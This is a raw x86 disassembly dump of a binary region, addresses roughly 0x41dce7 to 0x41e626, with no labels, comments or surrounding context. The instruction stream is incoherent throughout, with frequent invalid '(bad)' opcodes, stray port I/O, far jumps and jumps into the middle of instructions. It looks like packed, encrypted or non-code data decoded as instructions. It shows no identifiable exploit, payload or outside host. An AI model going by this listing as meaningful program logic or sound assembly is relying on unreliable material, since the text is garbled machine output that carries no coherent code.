  41dce7:	retf   0xb773
  41dcea:	pop    ebx
  41dceb:	xor    esp,esp
  41dced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcee:	mov    cl,BYTE PTR [ecx+0x10]
  41dcf1:	push   esp
  41dcf2:	pop    ecx
  41dcf3:	ficomp WORD PTR [edi-0x29]
  41dcf6:	push   esp
  41dcf7:	(bad)  
  41dcf8:	pop    ss
  41dcf9:	mov    ebx,0xf74b3b05
  41dcfe:	xchg   BYTE PTR [edi-0x6b23a6f0],dh
  41dd04:	cmp    esp,eax
  41dd06:	retf   0xfa6c
  41dd09:	paddq  mm3,QWORD PTR [esi-0x4c]
  41dd0d:	imul   eax,DWORD PTR [ecx-0x9],0xffffffa6
  41dd11:	mov    ds:0xd19fb092,al
  41dd16:	addr16 out dx,eax
  41dd18:	or     eax,0x1d484b01
  41dd1d:	jns    0x41dd96
  41dd1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd20:	pop    ecx
  41dd21:	add    al,0x41
  41dd23:	or     dh,BYTE PTR [ecx-0x69f34f13]
  41dd29:	jns    0x41dcd1
  41dd2b:	sbb    BYTE PTR [eax],dl
  41dd2d:	adc    edi,eax
  41dd2f:	out    0x2f,al
  41dd31:	ficom  DWORD PTR [esi+0x254c2996]
  41dd37:	push   ss
  41dd38:	outs   dx,BYTE PTR ds:[esi]
  41dd39:	fiadd  DWORD PTR [eax+eiz*4-0x16818c44]
  41dd40:	mov    bh,0xec
  41dd42:	iret   
  41dd43:	add    DWORD PTR [eax-0x63],ebp
  41dd46:	push   0x85f54444
  41dd4b:	push   ecx
  41dd4c:	mov    eax,ds:0xbcc5f7c9
  41dd51:	inc    edx
  41dd52:	retf   0xd1ca
  41dd55:	retf   0x670f
  41dd58:	or     al,0x3e
  41dd5a:	jne    0x41dcf9
  41dd5c:	pop    ebx
  41dd5d:	retf   0x4592
  41dd60:	sub    ah,al
  41dd62:	loop   0x41dd84
  41dd64:	call   DWORD PTR [ecx]
  41dd66:	aad    0x77
  41dd68:	xchg   DWORD PTR ds:0x7408a162,esp
  41dd6e:	aam    0x25
  41dd70:	(bad)  
  41dd71:	(bad)  
  41dd72:	mov    ds:0xed529a06,al
  41dd77:	into   
  41dd78:	cwde   
  41dd79:	or     eax,ebp
  41dd7b:	lods   eax,DWORD PTR ds:[esi]
  41dd7c:	sbb    DWORD PTR [eax],ebp
  41dd7e:	test   BYTE PTR [eax+edx*8-0x547e6d6],bl
  41dd85:	ins    BYTE PTR es:[edi],dx
  41dd86:	cmp    al,dh
  41dd88:	sub    al,0xf9
  41dd8a:	inc    edi
  41dd8b:	fiadd  WORD PTR [edi+edx*8-0x3d64daae]
  41dd92:	dec    esi
  41dd93:	sub    ecx,DWORD PTR [eax+esi*1-0x3d]
  41dd97:	jp     0x41ddc7
  41dd99:	mov    ebx,0x97d0b587
  41dd9e:	xor    eax,0x6e68545d
  41dda3:	je     0x41dd63
  41dda5:	jne    0x41ddf4
  41dda7:	cmp    eax,0x1e60bab9
  41ddac:	or     edx,DWORD PTR [eax-0x41]
  41ddaf:	jmp    0x5cb2:0x1e850897
  41ddb6:	into   
  41ddb7:	popa   
  41ddb8:	or     ah,BYTE PTR [esi+eiz*8]
  41ddbb:	int3   
  41ddbc:	jae    0x41dda5
  41ddbe:	push   ds
  41ddbf:	jmp    0x10b96fee
  41ddc4:	(bad)  
  41ddc5:	int3   
  41ddc6:	out    0xfb,eax
  41ddc8:	push   esp
  41ddc9:	inc    edi
  41ddca:	ds nop
  41ddcc:	enter  0x5384,0x4e
  41ddd0:	mov    cl,0xc1
  41ddd2:	dec    ebx
  41ddd3:	test   eax,0x1733881b
  41ddd8:	neg    bh
  41ddda:	or     edx,esi
  41dddc:	je     0x41de26
  41ddde:	push   edx
  41dddf:	jns    0x41dddf
  41dde1:	xor    eax,0x5ca5b3aa
  41dde6:	fisttp QWORD PTR [edi+eax*2-0x2e]
  41ddea:	pushf  
  41ddeb:	dec    ebp
  41ddec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dded:	test   eax,0x4626a703
  41ddf2:	addr16 and esi,ecx
  41ddf5:	pop    edi
  41ddf6:	out    0x4,al
  41ddf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddf9:	fidiv  WORD PTR [eax]
  41ddfb:	and    eax,0x3fa140b
  41de00:	pusha  
  41de01:	out    dx,al
  41de02:	out    0xd9,al
  41de04:	rcr    BYTE PTR [edi+eiz*4+0x7add94d],cl
  41de0b:	mov    es,WORD PTR ds:0xe7becf64
  41de11:	jae    0x41ddf5
  41de13:	(bad)  
  41de14:	jg     0x41ddda
  41de16:	in     al,0xf7
  41de18:	jb     0x41de96
  41de1a:	adc    DWORD PTR [edi],ecx
  41de1c:	add    al,0xc2
  41de1e:	(bad)  
  41de1f:	stc    
  41de20:	xchg   esp,eax
  41de21:	(bad)  
  41de22:	xchg   edi,eax
  41de23:	lahf   
  41de24:	mov    ch,0xe6
  41de26:	and    eax,0x95492bab
  41de2b:	cwde   
  41de2c:	inc    edi
  41de2d:	jbe    0x41de18
  41de2f:	push   esp
  41de30:	call   0x30cf61c5
  41de35:	push   ecx
  41de36:	xchg   ch,al
  41de38:	xchg   esi,eax
  41de39:	cmp    ebx,DWORD PTR [eax]
  41de3b:	sub    al,0x34
  41de3d:	add    DWORD PTR [edx+0x1d2d23b8],esp
  41de43:	std    
  41de44:	sbb    eax,0x661b8c9d
  41de49:	(bad)  
  41de4a:	pop    esp
  41de4b:	adc    esp,edi
  41de4d:	mov    esp,0x9e5e7525
  41de52:	dec    esi
  41de53:	pop    ecx
  41de54:	sub    al,0x22
  41de56:	pop    es
  41de57:	push   ecx
  41de58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de59:	je     0x41de2d
  41de5b:	xchg   BYTE PTR [edx],ch
  41de5d:	cmc    
  41de5e:	sub    edi,eax
  41de60:	inc    eax
  41de61:	int    0x52
  41de63:	scas   eax,DWORD PTR es:[edi]
  41de64:	xchg   edx,eax
  41de65:	ret    0xe045
  41de68:	xchg   esi,eax
  41de69:	cmp    BYTE PTR [edi-0x846ba5b],0x67
  41de70:	clc    
  41de71:	add    ebx,DWORD PTR [edi]
  41de73:	fimul  DWORD PTR [esi]
  41de75:	push   esi
  41de76:	pop    esp
  41de77:	cli    
  41de78:	add    bl,dh
  41de7a:	xchg   esp,eax
  41de7b:	jg     0x41deac
  41de7d:	adc    dh,BYTE PTR [esi+ebx*8+0x395a97b5]
  41de84:	xor    DWORD PTR [ebx],edx
  41de86:	(bad)  
  41de87:	pop    eax
  41de88:	push   ecx
  41de89:	add    ebx,esi
  41de8b:	lods   eax,DWORD PTR ds:[esi]
  41de8c:	(bad)  
  41de8d:	pop    edx
  41de8e:	ins    BYTE PTR es:[edi],dx
  41de8f:	jmp    0x14ea0a1
  41de94:	out    0x10,al
  41de96:	lods   al,BYTE PTR ds:[esi]
  41de97:	push   eax
  41de98:	add    al,0xcf
  41de9a:	arpl   WORD PTR [edi],si
  41de9c:	inc    esi
  41de9d:	pop    esp
  41de9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de9f:	or     eax,0xc7871de8
  41dea4:	(bad)  
  41dea5:	pop    edx
  41dea6:	aas    
  41dea7:	cdq    
  41dea8:	sbb    BYTE PTR [eax+0x9],0x33
  41deac:	xchg   ebx,eax
  41dead:	sub    ebp,ebp
  41deaf:	sbb    edx,DWORD PTR [esi]
  41deb1:	or     BYTE PTR ds:0xa7120b15,bl
  41deb7:	rol    DWORD PTR ds:0x10867f7,cl
  41debd:	pop    ss
  41debe:	push   0xd
  41dec0:	jbe    0x41de4b
  41dec2:	imul   BYTE PTR [ebp+0x16f2f269]
  41dec8:	xor    esp,DWORD PTR [edi]
  41deca:	cld    
  41decb:	rcr    ah,cl
  41decd:	(bad)  
  41dece:	cmp    DWORD PTR [esi+0x4c05fc9],0xfffffff2
  41ded5:	mov    ds:0xe0e3c0c6,al
  41deda:	aam    0x26
  41dedc:	cld    
  41dedd:	push   ecx
  41dede:	push   eax
  41dedf:	inc    eax
  41dee0:	sbb    dl,ah
  41dee2:	sub    bh,ah
  41dee4:	mov    esi,0xfd03fd16
  41dee9:	inc    edx
  41deea:	fnsave [edi+eax*1+0x79]
  41deee:	inc    edx
  41deef:	sub    eax,0xe534a6ea
  41def4:	add    al,0xd5
  41def6:	cld    
  41def7:	jmp    0x41dee7
  41def9:	test   ebp,esi
  41defb:	loopne 0x41dee9
  41defd:	xor    BYTE PTR [ebp-0x540228dd],al
  41df03:	jbe    0x41df23
  41df05:	or     al,0x1c
  41df07:	imul   edx,DWORD PTR [esi-0x17f5777f],0x3323ba56
  41df11:	mov    ah,BYTE PTR [ecx-0x3236a172]
  41df17:	aaa    
  41df18:	sub    BYTE PTR [ebp-0x6b579c63],0xab
  41df1f:	cmp    BYTE PTR [edi],dl
  41df21:	test   DWORD PTR [ebp-0x442989d3],edx
  41df27:	data16 lock jno 0x41df48
  41df2b:	jno    0x41df83
  41df2d:	ret    
  41df2e:	mov    ds:0xad1e0a12,eax
  41df33:	(bad)  
  41df35:	push   ss
  41df36:	mov    ah,0x39
  41df38:	adc    esp,ecx
  41df3a:	add    eax,esp
  41df3c:	jno    0x41df57
  41df3e:	sti    
  41df3f:	mov    ds,eax
  41df41:	sbb    BYTE PTR [eax],dl
  41df43:	adc    esi,DWORD PTR [eax-0x5e]
  41df46:	xor    edi,edx
  41df48:	cdq    
  41df49:	dec    edx
  41df4a:	out    0x36,al
  41df4c:	ins    BYTE PTR es:[edi],dx
  41df4d:	es scas eax,DWORD PTR es:[di]
  41df50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df51:	cmp    eax,ecx
  41df53:	inc    ebp
  41df54:	sbb    al,0x34
  41df56:	mov    ch,0x22
  41df58:	push   ebp
  41df59:	dec    edi
  41df5a:	cmp    cl,BYTE PTR [ebx+0x72380854]
  41df60:	adc    esp,DWORD PTR [edi+0x17]
  41df63:	ficomp WORD PTR [edx]
  41df65:	adc    BYTE PTR [esi+edx*2],cl
  41df68:	add    DWORD PTR [edx-0x46fb77],esp
  41df6e:	leave  
  41df6f:	mov    ds:0xe0e37ca4,eax
  41df74:	out    dx,eax
  41df75:	jmp    0x41dfda
  41df77:	push   esi
  41df78:	pop    ss
  41df79:	fcmovne st,st(6)
  41df7b:	lea    ebx,[ebx]
  41df7d:	mov    eax,ds:0x3921eacf
  41df82:	inc    ebx
  41df83:	inc    ecx
  41df84:	dec    ebx
  41df85:	inc    eax
  41df86:	jbe    0x41df26
  41df88:	add    al,BYTE PTR [esi+0x49]
  41df8b:	and    edi,DWORD PTR [edi-0x26]
  41df8e:	push   esp
  41df8f:	push   edx
  41df90:	xor    bl,BYTE PTR ss:[edi]
  41df93:	or     al,0x34
  41df95:	jle    0x41df3e
  41df97:	dec    eax
  41df98:	jb     0x41dfd4
  41df9a:	dec    eax
  41df9b:	inc    eax
  41df9c:	pop    esi
  41df9d:	in     al,dx
  41df9e:	ds dec bp
  41dfa1:	mov    esi,DWORD PTR [ebp-0x59cb802f]
  41dfa7:	jnp    0x41dfbe
  41dfa9:	jns    0x41dfd7
  41dfab:	out    0x3b,eax
  41dfad:	mov    ds:0x27ea7da1,al
  41dfb2:	xchg   ebp,eax
  41dfb3:	cwde   
  41dfb4:	sub    esi,DWORD PTR [edx-0x1f70d332]
  41dfba:	outs   dx,DWORD PTR ds:[esi]
  41dfbb:	int    0x6c
  41dfbd:	cmp    eax,0x362f9cab
  41dfc2:	mov    edi,0xa575fe1e
  41dfc7:	sbb    bh,BYTE PTR [ecx+0xe88b1c4]
  41dfcd:	(bad)  
  41dfce:	pop    esp
  41dfcf:	test   dl,al
  41dfd1:	clc    
  41dfd2:	test   DWORD PTR [ecx-0x1edbbb2c],ebp
  41dfd8:	loopne 0x41e00d
  41dfda:	xlat   BYTE PTR ds:[ebx]
  41dfdb:	in     al,0xed
  41dfdd:	loopne 0x41df90
  41dfdf:	pop    ebp
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	push   ds
  41dfe2:	add    BYTE PTR [edi],bh
  41dfe4:	jns    0x41dfa6
  41dfe6:	pop    esi
  41dfe7:	or     BYTE PTR [eax-0x54],bh
  41dfea:	jg     0x41e003
  41dfec:	mov    bl,0x24
  41dfee:	sti    
  41dfef:	pop    DWORD PTR [ecx-0x4c4147e5]
  41dff5:	sbb    BYTE PTR [ecx-0x7d62a4cc],dh
  41dffb:	mov    ds:0xbe5ba8e6,al
  41e000:	xchg   edx,eax
  41e001:	fadd   DWORD PTR [ecx]
  41e003:	fidiv  DWORD PTR [eax+0x2f]
  41e006:	hlt    
  41e007:	jecxz  0x41dfb4
  41e009:	cmp    al,0xa2
  41e00b:	add    BYTE PTR [eax],ch
  41e00d:	cmp    ax,WORD PTR [eax+0x18d004af]
  41e014:	mov    ch,0x35
  41e016:	pop    esp
  41e017:	loope  0x41e023
  41e019:	jg     0x41dfe8
  41e01b:	lds    ebp,FWORD PTR [ecx-0x23]
  41e01e:	call   0xc9d2:0x815ad87a
  41e025:	shl    BYTE PTR [edx-0x1d],1
  41e028:	jbe    0x41dfb6
  41e02a:	jo     0x41e059
  41e02c:	xchg   ecx,eax
  41e02d:	dec    edi
  41e02e:	sbb    edx,DWORD PTR ds:0xc36c83dc
  41e034:	push   es
  41e035:	cmp    dh,cl
  41e037:	retf   
  41e038:	jp     0x41e049
  41e03a:	repnz sub DWORD PTR [esi+0x2231cea],edi
  41e041:	fmul   QWORD PTR [edi+eiz*8-0x2459acdd]
  41e048:	jmp    0xf888c417
  41e04d:	out    dx,eax
  41e04e:	push   ds
  41e04f:	pop    ebx
  41e050:	loop   0x41e005
  41e052:	rcl    DWORD PTR ds:0x1bb2254d,cl
  41e058:	push   esp
  41e059:	sub    BYTE PTR [ecx+0x3],dh
  41e05c:	push   edi
  41e05d:	add    DWORD PTR [ebx-0x53c10224],esi
  41e063:	pushf  
  41e064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e065:	(bad)  
  41e066:	scas   eax,DWORD PTR es:[edi]
  41e067:	pop    ebp
  41e068:	cdq    
  41e069:	sub    BYTE PTR ds:0x68fa26f,ch
  41e06f:	std    
  41e070:	retf   0x7e8a
  41e073:	aas    
  41e074:	push   ds
  41e075:	mov    eax,DWORD PTR [eax+0x5]
  41e078:	and    edi,DWORD PTR [edx+0x258d3f15]
  41e07e:	mov    al,0x32
  41e080:	xchg   esi,eax
  41e081:	add    cl,dl
  41e083:	jno    0x41e080
  41e085:	inc    ecx
  41e086:	and    al,BYTE PTR [ecx-0xbfe555b]
  41e08c:	jecxz  0x41e06b
  41e08e:	and    cl,BYTE PTR [ecx]
  41e090:	pop    ss
  41e091:	cwde   
  41e092:	mov    DWORD PTR cs:[ecx+0x46],esi
  41e096:	and    DWORD PTR cs:[edx],ecx
  41e099:	jnp    0x41e0a8
  41e09b:	bound  edx,QWORD PTR [ecx]
  41e09d:	cld    
  41e09e:	shl    DWORD PTR [esi],1
  41e0a0:	push   edi
  41e0a1:	and    ah,0x6b
  41e0a4:	add    BYTE PTR [ebx],0x3f
  41e0a7:	lea    ecx,[ebp+0x31]
  41e0aa:	add    al,0xe8
  41e0ac:	fisub  WORD PTR [esi+0xa4450a0]
  41e0b2:	cmp    eax,0xabf6ec38
  41e0b7:	pop    ebp
  41e0b8:	rol    BYTE PTR [edx+0x74],cl
  41e0bb:	push   edx
  41e0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0bd:	outs   dx,DWORD PTR ds:[esi]
  41e0be:	jge    0x41e08b
  41e0c0:	clc    
  41e0c1:	stc    
  41e0c2:	test   DWORD PTR [edx-0x31],esp
  41e0c5:	inc    ecx
  41e0c6:	dec    ecx
  41e0c7:	mov    edi,0x98da61fa
  41e0cc:	mov    edi,0x8ea34d66
  41e0d1:	(bad)  
  41e0d2:	jnp    0x41e0cc
  41e0d4:	adc    al,dl
  41e0d6:	push   edi
  41e0d7:	aaa    
  41e0d8:	clc    
  41e0d9:	xchg   edi,eax
  41e0da:	daa    
  41e0db:	inc    eax
  41e0dc:	mov    cl,0xc6
  41e0de:	mov    ds:0xe0371b8f,al
  41e0e3:	fstp   QWORD PTR [ecx+0x6a2f613a]
  41e0e9:	repnz sbb edx,edi
  41e0ec:	call   FWORD PTR [ecx+0x52798636]
  41e0f2:	jno    0x41e0ba
  41e0f4:	fdivp  st(5),st
  41e0f6:	add    DWORD PTR [edx+0x44fa8399],ecx
  41e0fc:	iret   
  41e0fd:	nop
  41e0fe:	ja     0x41e0c7
  41e100:	xor    eax,0x5251fc52
  41e105:	out    0xbd,eax
  41e107:	imul   esp,DWORD PTR [edi+0x38],0xffffffe6
  41e10b:	pusha  
  41e10c:	sub    DWORD PTR [edi+0x487cfbc7],0x56eb85f4
  41e116:	scas   eax,DWORD PTR es:[edi]
  41e117:	call   0x94ec0d4
  41e11c:	test   al,0x4b
  41e11e:	test   al,0x17
  41e120:	xor    al,0xd9
  41e122:	stos   BYTE PTR es:[edi],al
  41e123:	ror    esp,0xda
  41e126:	in     eax,0xab
  41e128:	dec    esi
  41e129:	cld    
  41e12a:	adc    eax,ebx
  41e12c:	add    DWORD PTR [ebp-0x491f62a6],edi
  41e132:	jb     0x41e128
  41e134:	mov    eax,edx
  41e136:	push   ebx
  41e137:	sbb    al,0x3b
  41e139:	daa    
  41e13a:	push   edx
  41e13b:	lea    ebx,[ebx+0x7bb86032]
  41e141:	sub    eax,0x6f3f4ca5
  41e146:	adc    eax,0xddcb6b31
  41e14b:	adc    al,0x30
  41e14d:	dec    esi
  41e14e:	clc    
  41e14f:	mov    ebx,0x54ad8d30
  41e154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e155:	adc    eax,0x214ff76
  41e15a:	push   ss
  41e15b:	nop
  41e15c:	sar    BYTE PTR [ebx],1
  41e15e:	loop   0x41e1da
  41e160:	lea    ecx,ds:0x4cfdd744
  41e166:	pop    ss
  41e167:	enter  0x92f8,0x75
  41e16b:	push   cs
  41e16c:	pop    ds
  41e16d:	adc    dl,0xec
  41e170:	add    ebp,DWORD PTR [eax+eiz*4]
  41e173:	mov    bh,0x1d
  41e175:	push   es
  41e176:	xor    eax,0x4edcf33d
  41e17b:	and    BYTE PTR [ebx],ah
  41e17d:	je     0x41e1d1
  41e17f:	sub    esi,DWORD PTR [ecx+0xe6b4cba]
  41e185:	icebp  
	...
  41e35e:	adc    al,0xcb
  41e360:	mov    bl,0x9a
  41e362:	(bad)  
  41e363:	cli    
  41e364:	cmp    eax,0x190968cf
  41e369:	mov    esi,DWORD PTR [ecx]
  41e36b:	push   ss
  41e36c:	mov    ds:0x1a2175a,al
  41e371:	add    BYTE PTR [edx],ah
  41e373:	pop    es
  41e374:	add    BYTE PTR [eax],al
  41e376:	dec    esi
  41e377:	dec    esi
  41e378:	dec    edi
  41e379:	or     al,cl
  41e37b:	inc    ebp
  41e37c:	int    0x95
  41e37e:	adc    al,BYTE PTR [edx]
  41e380:	sar    BYTE PTR [ecx-0x2b2b4623],0x61
  41e387:	enter  0x4fe6,0xd9
  41e38b:	(bad)  
  41e38c:	repz jecxz 0x41e386
  41e38f:	jmp    0x319a:0xc69a8779
  41e396:	jae    0x41e36d
  41e398:	xchg   edi,eax
  41e399:	pop    ss
  41e39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e39b:	dec    edx
  41e39c:	js     0x41e392
  41e39e:	push   ss
  41e39f:	cmp    bl,bh
  41e3a1:	sbb    edi,DWORD PTR [ebx]
  41e3a3:	fxch   st(1)
  41e3a5:	jl     0x41e3fc
  41e3a7:	mov    ecx,0xdc47ea0d
  41e3ac:	shl    DWORD PTR [eax],1
  41e3ae:	xchg   esp,eax
  41e3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b0:	pop    eax
  41e3b1:	sub    eax,0xec4c429
  41e3b6:	out    0xcb,al
  41e3b8:	mov    ebx,0xffd7d3b3
  41e3bd:	or     DWORD PTR [ecx+0x38e3afc4],0x249b39b8
  41e3c7:	sub    DWORD PTR [ebp+0x66],0xffffff9c
  41e3cb:	scas   eax,DWORD PTR es:[edi]
  41e3cc:	sub    eax,0x7a226908
  41e3d1:	xchg   esp,eax
  41e3d2:	mov    ebx,0xd8ea8cb5
  41e3d7:	push   ecx
  41e3d9:	pop    ds
  41e3da:	test   BYTE PTR [esi-0x7eb8db37],0x40
  41e3e1:	std    
  41e3e2:	mov    ecx,0xe216c0f0
  41e3e7:	inc    ecx
  41e3e8:	sbb    eax,0xf9251b95
  41e3ed:	add    bl,BYTE PTR [esi+0x79]
  41e3f0:	(bad)  
  41e3f1:	xchg   edx,eax
  41e3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3f3:	mov    ch,0xa3
  41e3f5:	(bad)  
  41e3f6:	dec    ecx
  41e3f7:	les    edi,FWORD PTR [ecx+0x355789f3]
  41e3fd:	dec    eax
  41e3fe:	je     0x41e3e5
  41e400:	pop    esp
  41e401:	fcomi  st,st(4)
  41e403:	mov    edx,0xcc240f81
  41e408:	push   edi
  41e409:	adc    ah,BYTE PTR [edi-0x2b]
  41e40c:	outs   dx,BYTE PTR ds:[esi]
  41e40d:	and    eax,0x5a523ef4
  41e412:	sub    BYTE PTR [ecx],dl
  41e414:	enter  0x5df8,0xe5
  41e418:	inc    eax
  41e419:	push   ds
  41e41a:	push   ecx
  41e41b:	jp     0x41e463
  41e41d:	pop    ecx
  41e41e:	mov    dh,0xef
  41e420:	dec    esi
  41e421:	mov    dh,0x92
  41e423:	mov    ebp,0xea81ad8
  41e428:	(bad)  
  41e42a:	adc    BYTE PTR [ebp+0x25],bl
  41e42d:	outs   dx,DWORD PTR ds:[esi]
  41e42e:	cmc    
  41e42f:	adc    esi,esi
  41e431:	sahf   
  41e432:	mov    bl,0x8b
  41e434:	mov    DWORD PTR [eax-0x3],ebp
  41e437:	xlat   BYTE PTR ds:[ebx]
  41e438:	sbb    DWORD PTR [bp+di],ebx
  41e43b:	(bad)  
  41e43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e43d:	out    0xb9,eax
  41e43f:	push   edi
  41e440:	jle    0x41e430
  41e442:	or     al,0x84
  41e444:	ins    DWORD PTR es:[edi],dx
  41e445:	ror    DWORD PTR [ecx],1
  41e447:	add    DWORD PTR [edx-0x35],ebp
  41e44a:	(bad)  
  41e44b:	ffree  st(0)
  41e44d:	xchg   edi,eax
  41e44e:	and    dh,BYTE PTR [edi]
  41e450:	icebp  
  41e451:	cld    
  41e452:	loopne 0x41e425
  41e454:	popa   
  41e455:	jg     0x41e4c3
  41e457:	mov    ds,WORD PTR [ebp+edi*8+0x65]
  41e45b:	mov    WORD PTR [esi-0x16],gs
  41e45e:	jmp    0xe331b855
  41e463:	arpl   WORD PTR [ecx+0x23b96e5e],bp
  41e469:	outs   dx,DWORD PTR ds:[esi]
  41e46a:	mov    ds,WORD PTR [edx]
  41e46c:	pop    ebx
  41e46d:	push   edx
  41e46e:	dec    DWORD PTR [edi-0x29]
  41e471:	jbe    0x41e432
  41e473:	cli    
  41e474:	add    DWORD PTR [edx+edx*1],edi
  41e477:	add    cl,bh
  41e479:	sub    DWORD PTR [edi+ebx*2],edi
  41e47c:	shl    esp,1
  41e47e:	cmp    al,0x18
  41e480:	mov    eax,0xd190058f
  41e485:	and    eax,eax
  41e487:	ror    DWORD PTR [edx+0x16f1442a],0xa5
  41e48e:	fistp  DWORD PTR [edi+0x6e9d4738]
  41e494:	mov    es,ecx
  41e496:	and    bh,cl
  41e498:	imul   ecx,DWORD PTR [edx-0x3a],0x71
  41e49c:	popf   
  41e49d:	ins    DWORD PTR es:[edi],dx
  41e49e:	lds    edi,FWORD PTR [ecx+0x39]
  41e4a1:	ret    0x9b88
  41e4a4:	data16 or al,0x79
  41e4a7:	in     eax,0xe8
  41e4a9:	add    dl,ch
  41e4ab:	cmp    eax,0x48db3e9c
  41e4b0:	jmp    0x41e4d7
  41e4b2:	sub    esi,ebp
  41e4b4:	gs js  0x41e4a9
  41e4b7:	ret    
  41e4b8:	or     BYTE PTR [esi],ah
  41e4ba:	xor    ebp,DWORD PTR [ebx+0x222d0b56]
  41e4c0:	das    
  41e4c1:	dec    ebp
  41e4c2:	adc    cl,bh
  41e4c4:	xor    bl,dl
  41e4c6:	ror    BYTE PTR [edi+eax*4-0x35],cl
  41e4ca:	fadd   DWORD PTR [ecx+0x4e53fc08]
  41e4d0:	jle    0x41e54f
  41e4d2:	push   ss
  41e4d3:	push   es
  41e4d4:	inc    ecx
  41e4d5:	fptan  
  41e4d7:	cmp    al,dl
  41e4d9:	jl     0x41e4ef
  41e4db:	stc    
  41e4dc:	call   0xf7084be6
  41e4e1:	lods   al,BYTE PTR ds:[esi]
  41e4e2:	das    
  41e4e3:	or     eax,0x558124d7
  41e4e8:	mov    eax,0xec9305db
  41e4ed:	es push ds
  41e4ef:	test   DWORD PTR [ebp+0x61299dbe],0x5ea695a0
  41e4f9:	leave  
  41e4fa:	into   
  41e4fb:	xchg   esi,eax
  41e4fc:	leave  
  41e4fd:	repnz push esp
  41e4ff:	jo     0x41e4b8
  41e501:	push   0xfffffff7
  41e503:	pop    ecx
  41e504:	test   DWORD PTR ds:0x38e27e2f,0x8cc6ec0f
  41e50e:	pop    edi
  41e50f:	ja     0x41e496
  41e511:	mov    edx,0x63c8cde6
  41e516:	shl    dl,0xc
  41e519:	cwde   
  41e51a:	inc    ebp
  41e51b:	cli    
  41e51c:	stos   DWORD PTR es:[edi],eax
  41e51d:	(bad)  
  41e51e:	popa   
  41e51f:	fldcw  WORD PTR [ecx+edx*1+0x3d]
  41e523:	xor    bl,ah
  41e525:	push   edx
  41e526:	(bad)  
  41e528:	nop
  41e529:	fcomp  st(2)
  41e52b:	pop    edx
  41e52c:	dec    esi
  41e52d:	cwde   
  41e52e:	mov    bl,BYTE PTR [bp+si+0x47]
  41e532:	pushf  
  41e533:	sub    eax,0x12de5424
  41e538:	arpl   dx,cx
  41e53a:	or     al,0x34
  41e53c:	and    bh,bl
  41e53e:	push   ss
  41e53f:	push   ecx
  41e540:	sub    DWORD PTR [edi],esp
  41e542:	cmp    edi,DWORD PTR [ecx+0x2e]
  41e545:	xchg   esp,eax
  41e546:	out    0xa2,al
  41e548:	retf   0xba78
  41e54b:	mov    bh,0xf3
  41e54d:	add    eax,DWORD PTR [edx-0x56]
  41e550:	push   esp
  41e551:	(bad)  
  41e552:	pop    eax
  41e553:	xor    DWORD PTR [edi],esi
  41e555:	rol    ch,0xbd
  41e558:	and    DWORD PTR [edi-0x1c5b9162],0x62
  41e55f:	cs sti 
  41e561:	and    BYTE PTR [edx+0x9],al
  41e564:	enter  0xa7ed,0x3
  41e568:	clc    
  41e569:	sub    al,0x89
  41e56b:	add    DWORD PTR [esi-0x4820bd23],edx
  41e571:	aas    
  41e572:	inc    edi
  41e573:	adc    bh,BYTE PTR [eax]
  41e575:	inc    esp
  41e576:	lock fist DWORD PTR [edx]
  41e579:	cwde   
  41e57a:	pop    ebx
  41e57b:	cwde   
  41e57c:	mov    dl,0x4c
  41e57e:	mov    DWORD PTR [eax+edi*1-0x49],ebx
  41e582:	pop    ss
  41e583:	cld    
  41e584:	mov    BYTE PTR [ecx+eiz*1-0x1fb70c54],al
  41e58b:	fidiv  WORD PTR ds:0x9082f9b1
  41e591:	adc    cl,BYTE PTR [ebx+0x62]
  41e594:	xor    edx,ebx
  41e596:	pop    ebp
  41e597:	inc    ebx
  41e598:	imul   ebx,esi,0x4c926829
  41e59e:	rdpmc  
  41e5a0:	mov    gs,ebx
  41e5a2:	in     eax,0xcc
  41e5a4:	push   es
  41e5a5:	repz mov ah,0xc7
  41e5a8:	enter  0x6fd2,0x4e
  41e5ac:	add    BYTE PTR [eax-0x6d745bb1],ch
  41e5b2:	int3   
  41e5b3:	test   al,0x3e
  41e5b5:	mov    ds:0x67c0d69,al
  41e5ba:	add    DWORD PTR [edi-0x893a371],edx
  41e5c0:	ret    0x473b
  41e5c3:	jae    0x41e595
  41e5c5:	xchg   ebx,eax
  41e5c6:	les    ebp,FWORD PTR [esi+0x3d12f6d3]
  41e5cc:	adc    bl,bl
  41e5ce:	adc    BYTE PTR [edx-0x5fd90ad8],ah
  41e5d4:	std    
  41e5d5:	add    eax,0x4efbb73f
  41e5da:	sahf   
  41e5db:	scas   eax,DWORD PTR es:[edi]
  41e5dc:	adc    ecx,ebp
  41e5de:	jb     0x41e600
  41e5e0:	sbb    al,0x2e
  41e5e2:	fcom   DWORD PTR [ebp-0x52]
  41e5e5:	call   0x2f81:0x5c7ef3f7
  41e5ec:	int    0x9c
  41e5ee:	and    bl,BYTE PTR [edx+0x5912cd13]
  41e5f4:	or     DWORD PTR [ecx],0xffffffba
  41e5f7:	cwde   
  41e5f8:	adc    DWORD PTR gs:[edx],ebx
  41e5fb:	lock xchg DWORD PTR [edi+0x1],ebx
  41e5ff:	or     dh,BYTE PTR [esi-0x135c423b]
  41e605:	fs iret 
  41e607:	jg     0x41e679
  41e609:	inc    eax
  41e60a:	and    BYTE PTR [ebx],dl
  41e60c:	ss out 0x11,eax
  41e60f:	xchg   BYTE PTR [ebx-0x4],dh
  41e612:	(bad)  
  41e613:	jne    0x41e5e5
  41e615:	test   BYTE PTR [ecx],al
  41e617:	fs inc edi
  41e619:	sbb    al,0x41
  41e61b:	add    DWORD PTR [ebx],eax
  41e61d:	pop    ds
  41e61e:	push   0x1b
  41e620:	ret    0xd3e0
  41e623:	sub    bh,BYTE PTR [eax-0xe]
  41e626:	dec    esp
